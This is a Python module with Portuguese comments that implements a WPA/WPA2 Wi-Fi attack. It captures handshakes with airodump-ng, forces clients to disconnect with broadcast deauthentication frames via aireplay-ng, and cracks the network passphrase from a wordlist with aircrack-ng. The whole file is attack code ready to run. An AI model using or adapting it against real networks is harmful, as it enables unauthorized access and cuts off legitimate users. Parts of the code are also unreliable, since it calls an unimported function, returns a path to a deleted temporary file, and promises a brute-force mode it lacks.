"""
Módulo de ataque WPA/WPA2 Handshake.

Este módulo implementa ataques contra redes WPA/WPA2, incluindo:
- Captura de handshake WPA/WPA2
- Ataque de dicionário
- Ataque de força bruta
"""
import os
import re
import time
import logging
import subprocess
import tempfile
from typing import Optional, Dict, List, Tuple, Any, Callable
from dataclasses import dataclass, field
from enum import Enum, auto

from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn

from ...core.models.network import WiFiNetwork, WiFiClient
from ...core.utils import (
    is_root, check_dependencies, get_network_interfaces,
    set_monitor_mode, restore_network_interface, command_exists
)

# Configuração de logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)
console = Console()

class WPAEventType(Enum):
    """Tipos de eventos do ataque WPA."""
    START = auto()
    HANDSHAKE_CAPTURED = auto()
    CRACK_SUCCESS = auto()
    CRACK_FAILED = auto()
    DEAUTH_SENT = auto()
    ERROR = auto()
    PROGRESS = auto()
    COMPLETE = auto()

@dataclass
class WPAEvent:
    """Evento de progresso do ataque WPA."""
    type: WPAEventType
    message: str = ""
    data: Dict[str, Any] = field(default_factory=dict)

class WPAHandshakeAttack:
    """Classe para realizar ataques WPA/WPA2 Handshake."""
    
    def __init__(self, interface: str = None, timeout: int = 300):
        """
        Inicializa o ataque WPA Handshake.
        
        Args:
            interface: Interface de rede para usar no ataque
            timeout: Tempo máximo de execução em segundos
        """
        self.interface = interface
        self.timeout = timeout
        self.is_running = False
        self.stop_requested = False
        self.handshake_captured = False
        self.handshake_file = ""
        self.psk = ""
        
        # Verifica dependências
        self._check_dependencies()
        
        # Verifica privilégios
        if not is_root():
            raise PermissionError("Este ataque requer privilégios de root")
    
    def _check_dependencies(self) -> None:
        """Verifica se todas as dependências necessárias estão instaladas."""
        required = ['airodump-ng', 'aireplay-ng', 'aircrack-ng', 'tshark']
        missing = [cmd for cmd in required if not command_exists(cmd)]
        
        if missing:
            raise RuntimeError(
                f"As seguintes dependências estão faltando: {', '.join(missing)}\n"
                "Instale-as com: sudo apt install aircrack-ng tshark"
            )
    
    def capture_handshake(self, bssid: str, essid: str, channel: int, 
                         output_prefix: str = "handshake", 
                         deauth: bool = True,
                         deauth_count: int = 5,
                         callback: Callable[[WPAEvent], None] = None) -> Tuple[bool, str]:
        """
        Captura o handshake WPA/WPA2 de uma rede.
        
        Args:
            bssid: Endereço MAC do ponto de acesso
            essid: Nome da rede (ESSID)
            channel: Canal da rede
            output_prefix: Prefixo para os arquivos de saída
            deauth: Se deve enviar pacotes de desautenticação
            deauth_count: Número de pacotes de desautenticação a enviar
            callback: Função de callback para eventos
            
        Returns:
            Tupla (sucesso, caminho_do_arquivo_capturado)
        """
        self.is_running = True
        self.stop_requested = False
        self.handshake_captured = False
        self.handshake_file = ""
        
        # Configura o monitoramento de eventos
        def event_handler(event_type: WPAEventType, message: str = "", **kwargs):
            if callback:
                event = WPAEvent(type=event_type, message=message, data=kwargs)
                callback(event)
        
        # Cria um diretório temporário para os arquivos
        with tempfile.TemporaryDirectory() as temp_dir:
            try:
                output_file = os.path.join(temp_dir, output_prefix)
                
                # Inicia o airodump-ng para capturar o handshake
                cmd_airodump = [
                    'airodump-ng',
                    '--bssid', bssid,
                    '-c', str(channel),
                    '-w', output_file,
                    '--output-format', 'cap,pcap',
                    self.interface
                ]
                
                event_handler(WPAEventType.START, "Iniciando captura do handshake...")
                
                # Executa o airodump-ng em segundo plano
                airodump_proc = subprocess.Popen(
                    cmd_airodump,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    universal_newlines=True
                )
                
                # Se solicitado, envia pacotes de desautenticação
                if deauth:
                    self._send_deauth(bssid, count=deauth_count, callback=event_handler)
                
                # Monitora a saída do airodump-ng
                start_time = time.time()
                handshake_file = f"{output_file}-01.cap"
                
                with Progress(
                    SpinnerColumn(),
                    TextColumn("[progress.description]{task.description}"),
                    BarColumn(bar_width=40),
                    "[progress.percentage]{task.percentage:>3.0f}%",
                    TimeElapsedColumn(),
                    console=console,
                    transient=True,
                ) as progress:
                    task = progress.add_task("Aguardando handshake WPA...", total=100)
                    
                    while True:
                        # Verifica timeout
                        if time.time() - start_time > self.timeout:
                            event_handler(
                                WPAEventType.ERROR,
                                "Tempo limite excedido na captura do handshake"
                            )
                            airodump_proc.terminate()
                            return False, ""
                        
                        # Verifica se foi solicitado para parar
                        if self.stop_requested:
                            event_handler(
                                WPAEventType.ERROR,
                                "Captura interrompida pelo usuário"
                            )
                            airodump_proc.terminate()
                            return False, ""
                        
                        # Verifica se o arquivo de captura existe
                        if os.path.exists(handshake_file):
                            # Verifica se o handshake foi capturado
                            if self._check_handshake(handshake_file, bssid):
                                self.handshake_captured = True
                                self.handshake_file = handshake_file
                                event_handler(
                                    WPAEventType.HANDSHAKE_CAPTURED,
                                    "Handshake capturado com sucesso!",
                                    handshake_file=handshake_file
                                )
                                airodump_proc.terminate()
                                return True, handshake_file
                        
                        # Atualiza a barra de progresso
                        elapsed = time.time() - start_time
                        progress.update(task, completed=min(100, (elapsed / self.timeout) * 100))
                        
                        # Aguarda um pouco antes da próxima verificação
                        time.sleep(1)
                
            except Exception as e:
                event_handler(
                    WPAEventType.ERROR,
                    f"Erro durante a captura do handshake: {str(e)}"
                )
                return False, ""
            
            finally:
                self.is_running = False
                # Encerra processos em execução
                try:
                    airodump_proc.terminate()
                except:
                    pass
    
    def _send_deauth(self, bssid: str, count: int = 5, 
                    reason: int = 7, client: str = "ff:ff:ff:ff:ff:ff",
                    callback: Callable[[WPAEvent], None] = None) -> bool:
        """
        Envia pacotes de desautenticação para forçar um handshake.
        
        Args:
            bssid: Endereço MAC do ponto de acesso
            count: Número de pacotes a enviar
            reason: Código de motivo da desautenticação
            client: Endereço MAC do cliente (padrão: broadcast)
            callback: Função de callback para eventos
            
        Returns:
            True se os pacotes foram enviados com sucesso, False caso contrário
        """
        try:
            cmd = [
                'aireplay-ng',
                '--deauth', str(count),
                '-a', bssid,
                '-c', client,
                '-h', get_interface_mac(self.interface) or '00:11:22:33:44:55',
                '--ignore-negative-one',
                self.interface
            ]
            
            if callback:
                event = WPAEvent(
                    type=WPAEventType.DEAUTH_SENT,
                    message=f"Enviando {count} pacotes de desautenticação...",
                    data={'bssid': bssid, 'client': client, 'count': count}
                )
                callback(event)
            
            subprocess.run(cmd, capture_output=True, check=True)
            return True
            
        except subprocess.CalledProcessError as e:
            if callback:
                event = WPAEvent(
                    type=WPAEventType.ERROR,
                    message=f"Erro ao enviar pacotes de desautenticação: {e.stderr}",
                    data={'error': str(e)}
                )
                callback(event)
            return False
    
    def _check_handshake(self, cap_file: str, bssid: str) -> bool:
        """
        Verifica se um arquivo de captura contém um handshake WPA válido.
        
        Args:
            cap_file: Caminho para o arquivo de captura
            bssid: Endereço MAC do ponto de acesso
            
        Returns:
            True se o handshake for válido, False caso contrário
        """
        try:
            # Usa o aircrack-ng para verificar o handshake
            cmd = ['aircrack-ng', cap_file, '-b', bssid, '-l', '/dev/null']
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            # Verifica a saída para determinar se há um handshake válido
            return "1 handshake" in result.stdout or "1 valid handshake" in result.stdout
            
        except Exception as e:
            logger.error(f"Erro ao verificar handshake: {e}")
            return False
    
    def crack_handshake(self, handshake_file: str, wordlist: str, 
                       bssid: str = "", essid: str = "",
                       callback: Callable[[WPAEvent], None] = None) -> Tuple[bool, str]:
        """
        Tenta quebrar um handshake WPA/WPA2 usando um dicionário.
        
        Args:
            handshake_file: Caminho para o arquivo de handshake (.cap)
            wordlist: Caminho para o arquivo de wordlist
            bssid: Endereço MAC do ponto de acesso (opcional)
            essid: Nome da rede (opcional)
            callback: Função de callback para eventos
            
        Returns:
            Tupla (sucesso, senha)
        """
        if not os.path.exists(handshake_file):
            if callback:
                event = WPAEvent(
                    type=WPAEventType.ERROR,
                    message=f"Arquivo de handshake não encontrado: {handshake_file}",
                    data={'handshake_file': handshake_file}
                )
                callback(event)
            return False, ""
        
        if not os.path.exists(wordlist):
            if callback:
                event = WPAEvent(
                    type=WPAEventType.ERROR,
                    message=f"Arquivo de wordlist não encontrado: {wordlist}",
                    data={'wordlist': wordlist}
                )
                callback(event)
            return False, ""
        
        self.is_running = True
        self.stop_requested = False
        self.psk = ""
        
        # Configura o monitoramento de eventos
        def event_handler(event_type: WPAEventType, message: str = "", **kwargs):
            if callback:
                event = WPAEvent(type=event_type, message=message, data=kwargs)
                callback(event)
        
        try:
            # Comando para quebrar o handshake
            cmd = [
                'aircrack-ng',
                handshake_file,
                '-w', wordlist,
                '-l', os.path.join(os.path.dirname(handshake_file), 'cracked.txt')
            ]
            
            if bssid:
                cmd.extend(['-b', bssid])
            
            if essid:
                cmd.extend(['-e', f'"{essid}"'])
            
            event_handler(WPAEventType.START, "Iniciando quebra do handshake...")
            
            # Executa o aircrack-ng
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            # Monitora a saída
            key_found = False
            key_pattern = re.compile(r'KEY FOUND! \[ ([^\]]+) \]')
            progress_pattern = re.compile(r'(\d+)/(\d+) keys tested \((\d+\.\d+)\s*([kMG]?)\s*keys/s\)')
            
            while True:
                # Verifica se foi solicitado para parar
                if self.stop_requested:
                    process.terminate()
                    event_handler(
                        WPAEventType.ERROR,
                        "Quebra de senha interrompida pelo usuário"
                    )
                    return False, ""
                
                # Lê a saída
                line = process.stdout.readline()
                if not line and process.poll() is not None:
                    break
                
                if line:
                    # Verifica se encontrou a chave
                    key_match = key_pattern.search(line)
                    if key_match:
                        self.psk = key_match.group(1)
                        key_found = True
                        event_handler(
                            WPAEventType.CRACK_SUCCESS,
                            f"Senha encontrada: {self.psk}",
                            psk=self.psk
                        )
                        process.terminate()
                        return True, self.psk
                    
                    # Verifica o progresso
                    progress_match = progress_pattern.search(line)
                    if progress_match:
                        current = int(progress_match.group(1))
                        total = int(progress_match.group(2))
                        speed = float(progress_match.group(3))
                        unit = progress_match.group(4)
                        
                        # Converte a velocidade para keys/s
                        if unit == 'k':
                            speed *= 1000
                        elif unit == 'M':
                            speed *= 1000000
                        elif unit == 'G':
                            speed *= 1000000000
                        
                        # Calcula o progresso
                        progress = (current / total) * 100 if total > 0 else 0
                        
                        event_handler(
                            WPAEventType.PROGRESS,
                            f"Progresso: {progress:.2f}% - {speed:,.0f} senhas/segundo",
                            progress=progress,
                            current=current,
                            total=total,
                            speed=speed
                        )
                
                # Aguarda um pouco antes da próxima verificação
                time.sleep(0.1)
            
            # Verifica se o processo terminou com sucesso
            if process.poll() == 0 and not key_found:
                event_handler(
                    WPAEventType.CRACK_FAILED,
                    "Senha não encontrada na wordlist fornecida"
                )
            
            return key_found, self.psk if key_found else ""
            
        except Exception as e:
            event_handler(
                WPAEventType.ERROR,
                f"Erro durante a quebra do handshake: {str(e)}"
            )
            return False, ""
            
        finally:
            self.is_running = False
    
    def stop(self):
        """Solicita a interrupção do ataque."""
        self.stop_requested = True
